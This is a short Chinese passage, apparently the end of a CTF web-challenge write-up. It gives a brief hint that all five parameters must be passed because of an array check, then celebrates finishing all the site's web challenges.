别忘惹它有传入数组的判断~所以五个都要传

至此这个可爱哒网站上的web就都ak啦~喜大普奔~完结撒花~~~